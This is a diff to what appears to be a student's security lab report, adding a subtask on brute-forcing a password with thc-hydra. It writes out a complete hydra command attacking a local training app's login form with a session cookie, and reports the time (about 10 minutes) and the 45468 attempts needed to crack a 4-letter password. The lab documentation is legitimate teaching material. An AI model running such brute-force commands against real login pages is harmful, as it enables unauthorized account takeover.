@@ -114,6 +114,18 @@ Here is the encoding of my personal data and how it comes back to the original t
 
 # Subtask 5: thc-hydra (1p)
 
+New password has been found : 
 
- 
- 
+![image](https://github.com/Ploooot/Security_Engineering/assets/121863850/94c51c55-2d2d-4b58-9910-e28045fa444d)
+
+Now we try to find the time we need to find a 4 letters password.
+We use this command : docker run --network="host" vanhauser/hydra -V -f -I -l admin -x 1:4:a "http-get-form://localhost/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=pe0ee9lggovv3d4pjp835ns174;security=low:F=Username and/or password incorrect."
+The operation started at 11:27:11
+
+![Screenshot_20231006_142729_Gallery](https://github.com/Ploooot/Security_Engineering/assets/121863850/d84cdae2-ba4b-4a0a-8fa7-cf2b7459ee9b)
+
+It ended at 11:37:31
+
+![image](https://github.com/Ploooot/Security_Engineering/assets/121863850/b531a486-6fee-4371-a8e1-1f3a99af8796)
+
+This program took 10 minutes and 20 secondes and 45468 attempts to find the password.
